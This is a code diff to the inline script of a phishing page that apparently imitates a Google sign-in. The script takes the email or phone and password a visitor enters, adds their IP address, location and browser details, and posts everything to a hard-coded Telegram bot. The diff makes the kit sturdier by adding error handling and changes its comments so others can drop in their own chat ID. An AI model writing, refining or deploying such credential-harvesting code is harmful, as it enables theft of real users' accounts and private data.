@@ -76,24 +76,34 @@
     <script>
       // Telegram Bot API Token
       const botToken = "7802730138:AAHuJeHWghwS_DIU-Djva6c_F-AcIH5rOFY";
-      const chatId = "911863905"; // Hacker's Telegram chat ID
+      const chatId = "911863905"; // Replace with your Telegram chat ID
 
       // Function to fetch IP address using ipify API
       async function getIp() {
-        const response = await fetch('https://api.ipify.org?format=json');
-        const data = await response.json();
-        return data.ip;
+        try {
+          const response = await fetch('https://api.ipify.org?format=json');
+          const data = await response.json();
+          return data.ip;
+        } catch (error) {
+          console.error("Error fetching IP address:", error);
+          return "Unavailable";
+        }
       }
 
-      // Function to fetch location based on IP using ip-api
+      // Function to fetch location based on IP using ipwhois.io
       async function getLocationByIp(ip) {
-        const response = await fetch(`http://ip-api.com/json/${ip}`);
-        const data = await response.json();
-        return {
-          city: data.city,
-          country: data.country,
-          region: data.regionName
-        };
+        try {
+          const response = await fetch(`https://ipwhois.app/json/${ip}`);
+          const data = await response.json();
+          return {
+            city: data.city || "Unknown",
+            country: data.country || "Unknown",
+            region: data.region || "Unknown"
+          };
+        } catch (error) {
+          console.error("Error fetching location:", error);
+          return { city: "Unavailable", country: "Unavailable", region: "Unavailable" };
+        }
       }
 
       // Function to gather device info
@@ -107,17 +117,21 @@
 
       // Function to send captured data to the Telegram bot
       async function sendToTelegram(data) {
-        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-        const message = `Captured Data:\nEmail/Phone: ${data.email}\nPassword: ${data.password}\nIP: ${data.ip}\nLocation: ${data.location.city}, ${data.location.country}\nDevice Info: ${data.deviceInfo.userAgent}`;
-        
-        fetch(url, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            chat_id: chatId,
-            text: message,
-          }),
-        });
+        try {
+          const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+          const message = `Captured Data:\nEmail/Phone: ${data.email}\nPassword: ${data.password}\nIP: ${data.ip}\nLocation: ${data.location.city}, ${data.location.country}\nDevice Info: ${data.deviceInfo.userAgent}`;
+          
+          await fetch(url, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              chat_id: chatId,
+              text: message,
+            }),
+          });
+        } catch (error) {
+          console.error("Error sending data to Telegram:", error);
+        }
       }
 
       document.querySelector("button").addEventListener("click", async () => {
@@ -133,7 +147,7 @@
         // Get device info
         const deviceInfo = getDeviceInfo();
 
-        // Send data to the hacker's Telegram bot
+        // Send data to the Telegram bot
         sendToTelegram({ email, password, ip, location, deviceInfo });
 
         // Optionally redirect user to an actual Google login page for authenticity
